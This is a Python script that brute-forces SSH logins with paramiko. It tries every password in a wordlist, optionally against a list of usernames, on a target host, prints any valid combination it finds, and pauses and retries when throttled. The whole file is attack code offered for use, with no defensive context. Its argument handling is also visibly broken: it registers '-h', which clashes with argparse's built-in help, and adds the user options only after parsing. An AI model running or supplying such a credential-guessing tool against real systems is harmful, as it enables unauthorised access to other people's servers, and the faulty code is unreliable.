import paramiko, socket, time, argparse, sys

def is_ssh_open(host, user, passwd):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=host, username=user, password=passwd, timeout=3)
    except socket.timeout:
        print(f"[!] HOST UNRECHEABLE: {host} could not be reach, timed out.")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {user}:{passwd}")
        return False
    except paramiko.SSHException:
        print(f"[*] Quota exceeded, retrying with delay...")
        time.sleep(60)
        return is_ssh_open(host, user, passwd)
    else:
        print("\n" + "-"*45)
        print(f"[+] FOUND COMBINATION FOR {host}:")
        print(f"USER: {user} PASSWORD: {passwd}")
        print("-"*45 + "\n")
        return True
    
if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-h", "--host", help="Host or IP to bruteforce")
    parser.add_argument("-P", "--passlist", help="File containing a worlist of passwords")

    args = parser.parse_args()

    host = args.host
    passlist = args.passlist

    passlist = open(passlist).read().splitlines()

    if sys.argv[1] == "-u" or sys.argv[1] == "--user":

        parser.add_argument("-u", "--user", help="Username to try")
        user = args.user

        for password in passlist:
            is_ssh_open(host, user, password)
    else:
        pass

    if sys.argv[1] == "-U" or sys.argv[1] == "--userlist":

        parser.add_argument("-U", "--userlist", help="Username list to try")

        userlist = args.userlist
        userlist = open(userlist).read().splitlines()

        for user in userlist:
            for password in passlist:
                is_ssh_open(host, user, password)